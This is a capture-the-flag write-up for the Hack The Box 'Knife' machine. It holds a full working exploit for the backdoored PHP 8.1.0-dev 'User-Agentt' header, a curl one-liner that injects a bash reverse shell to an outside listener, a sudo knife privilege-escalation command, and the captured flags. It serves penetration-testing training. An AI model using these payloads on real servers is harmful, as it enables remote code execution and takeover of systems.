# Knife

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6b047d79-69bf-4a4d-aec3-f51ced0790a9)


> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.10.242 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-24 23:19 PDT
Nmap scan report for 10.10.10.242
Host is up (0.019s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
|_  256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.65 seconds
```

1. Found 2 ports open, and the machine is running a web application with PHP version 8.1.0.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6970c5b2-6643-4afc-ae61-ce75826b97ca)


2. Turns out the PHP version is vulnerable to Backdoor RCE.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fe82c05d-6479-4eae-90d8-c06224a807d2)


3. Based from this exploit.db documentation --> `https://www.exploit-db.com/exploits/49933`, we can add **User-Agentt** at the request header to gain RCE.
4. Let's use the script provided there.

> SCRIPT FROM DOCUMENTATION

```py
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#    - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

#### NOTES:

```
Another simple way, you can use this:

Set up a python server, then run set a listener on port 1337, run this afterwards:

curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i
&>/dev/tcp/10.10.14.25/1337 0>&1 '\");"
```

> RESULT

```
┌──(brandy㉿bread-yolk)-[~/machine_knife]
└─$ python3 backdoor_rce.py
Enter the full host url:
http://10.10.10.242 

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var

$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ whoami
james

$
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f43c6df3-d20d-4f6a-826b-9d87364c4215)


## USER FLAG

```
b18383f88c92034b8db5157c1c8c28fb
```

5. To get the root flag, let's run `sudo -l` to see the sudo permissions for james.

```
$ sudo -l 
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

$ 
```

6. We can run a tool named knife as root, we can use this for privesc.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/75cbb401-833d-4af7-9666-a1f1ea903f24)


7. But to get privesc, we need to do reverse shell first.

> Example of we can't use knife.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/10a0cdc8-9572-43fc-9eb9-55e57162dc92)


> Getting reverse shell

![pentest-knnife](https://github.com/jon-brandy/hackthebox/assets/70703371/fdc1a609-bed9-40cd-8237-3cefd45d0479)


> Privesc moment

```
Command:

sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
```

> RESULT

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.242] 50652
bash: cannot set terminal process group (947): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6ad88a19-39c0-452c-acfe-8a9cfc43d086)


## ROOT FLAG

```
5c78862fec523cd01ebd58711da58323
```
